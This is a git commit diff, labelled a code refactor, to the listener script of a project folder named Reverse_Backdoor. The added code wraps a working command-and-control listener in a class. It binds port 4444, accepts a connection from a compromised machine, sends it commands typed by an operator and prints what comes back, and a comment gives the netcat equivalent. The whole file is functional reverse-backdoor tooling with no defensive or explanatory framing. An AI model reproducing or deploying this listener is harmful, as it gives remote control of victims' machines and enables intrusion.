db40ad0842d69fe4569b3b20f49d3c51cdb0fda8
developerkhashab <mohammad.khashab.mk@gmail.com>
2020-10-06 12:43:50 -0400

    code refactor

--- Reverse_Backdoor/listener.py
+++ Reverse_Backdoor/listener.py
@@ -2,18 +2,29 @@
 
 import socket
 
-listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# this line will reuse socket if connection dropped
-listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-listener.bind(("", 4444))
-listener.listen(1)
-print("[+] waiting for a connection")
-connection, address = listener.accept()
-print("[+] got a connection from " + str(address))
 
-while True:
-    command = input(">> ")
-    connection.send(command.encode())
-    result = connection.recv(1024)
-    print(result)
+class Listener:
+    def __init__(self, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # this line will reuse socket if connection dropped
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind(("", port))
+        listener.listen(1)
+        print("[+] waiting for a connection")
+        self.connection, address = listener.accept()
+        print("[+] got a connection from " + str(address))
+
+    def execute_remotely(self, command):
+        self.connection.send(command.encode())
+        return self.connection.recv(1024)
+
+    def run(self):
+        while True:
+            command = input(">> ")
+            result = self.execute_remotely(command)
+            print(result)
+
+
 # nc -vv -l -p 4444
+my_listener = Listener(4444)
+my_listener.run()
